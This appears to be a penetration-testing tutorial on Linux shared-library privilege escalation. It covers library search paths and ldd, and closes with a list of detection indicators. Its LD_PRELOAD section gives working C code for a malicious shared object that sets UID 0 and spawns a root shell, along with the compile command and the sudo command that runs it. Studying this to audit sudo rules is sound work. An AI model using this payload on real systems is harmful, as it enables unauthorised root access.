## Overview

Linux programs commonly rely on **shared libraries** to provide reusable functionality without embedding all code directly inside the executable.

Shared libraries allow developers to:

- reduce code duplication
- decrease binary size
- simplify updates
- maintain modular software architecture

However, this flexibility introduces a potential **privilege escalation vector** if library loading behaviour can be influenced by an attacker.

---

# Types of Libraries in Linux

## Static Libraries (.a)

Static libraries are compiled directly into the binary at build time.

Characteristics:

- become part of the executable
- cannot be altered without recompiling the binary
- larger binary size
- generally not useful for privilege escalation

---

## Dynamic Libraries (.so)

Dynamic libraries are loaded **at runtime**.

Characteristics:

- referenced externally
- can be replaced or manipulated
- loaded via dynamic linker
- commonly found in:

```
/lib
/usr/lib
/usr/lib64
```

These libraries are prime targets for exploitation because they influence program execution flow.

---

# How Linux Locates Shared Libraries

Linux determines where to load libraries from using several mechanisms:

## rpath

Hardcoded search path embedded at compile time.

```bash
gcc program.c -Wl,-rpath=/custom/path
```

---

## LD_LIBRARY_PATH

Environment variable specifying custom library locations.

```bash
export LD_LIBRARY_PATH=/tmp/lib
```

---

## LD_RUN_PATH

Similar to rpath but defined during compilation.

---

## Default library paths

Common directories:

```
/lib
/usr/lib
/usr/lib64
```

---

## ld.so configuration

Configured in:

```
/etc/ld.so.conf
/etc/ld.so.conf.d/
```

---

# Viewing Shared Library Dependencies

The **ldd** tool displays libraries required by a binary.

```bash
ldd /bin/ls
```

Example output:

```
linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0
```

This shows:

- library names
- load paths
- dependency chain

# LD_PRELOAD Privilege Escalation

## Concept

The **LD_PRELOAD** environment variable allows a user to specify a shared library that should be loaded **before all others**.

Because it loads first:

its functions override default implementations.

If misconfigured in sudo permissions, LD_PRELOAD can be used to execute arbitrary code as root.

---

# Conditions Required

LD_PRELOAD exploitation requires:

- sudo access to a binary
- LD_PRELOAD permitted in environment variables
- ability to create a malicious shared object (.so)
- binary executed with elevated privileges

---

# Identifying LD_PRELOAD Opportunities

Check sudo permissions:

```bash
sudo -l
```

Example:

```
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Key indicator:

```
env_keep+=LD_PRELOAD
```

This means sudo preserves the LD_PRELOAD environment variable.

---

# Creating Malicious Shared Library

Create C source file:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Explanation:

- _init() runs automatically when library loads
- unsetenv prevents recursion
- setuid(0) sets effective UID to root
- system("/bin/bash") spawns root shell

---

# Compile Shared Library

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Flags explained:

| Flag | Purpose |
|------|--------|
| -fPIC | position independent code |
| -shared | produce shared object |
| -nostartfiles | avoid linking default startup files |

---

# Execute Exploit

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

If successful:

```bash
id
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

# Additional Shared Library Attack Vectors

## Writable library directories

If user has write access to directories in:

```
/usr/lib
/lib
```

Libraries may be replaced.

---

## Weak rpath configurations

Applications may load libraries from insecure directories.

Check rpath:

```bash
readelf -d binary | grep PATH
```

---

## Relative path library loading

Applications loading libraries using relative paths may allow hijacking.

---

## LD_LIBRARY_PATH injection

If application allows custom library paths:

```bash
LD_LIBRARY_PATH=/tmp ./binary
```

---

```bash

```

---

## Check for LD_PRELOAD retention

```bash
sudo -l | grep LD_PRELOAD
```

---

# Detection Indicators

Potential misconfigurations:

- env_keep+=LD_PRELOAD present
- writable library directories
- custom rpath values
- binaries loading libraries from user-controlled paths
- weak sudo rules allowing service restarts

# Key Takeaways

- shared libraries allow modular code reuse
- dynamic linking introduces attack surface
- LD_PRELOAD allows overriding legitimate functions
- misconfigured sudo rules enable privilege escalation
- shared object injection is highly reliable when permitted
- enumeration of library paths is critical during post-exploitation
- LD_PRELOAD is one of the most common Linux privilege escalation vectors
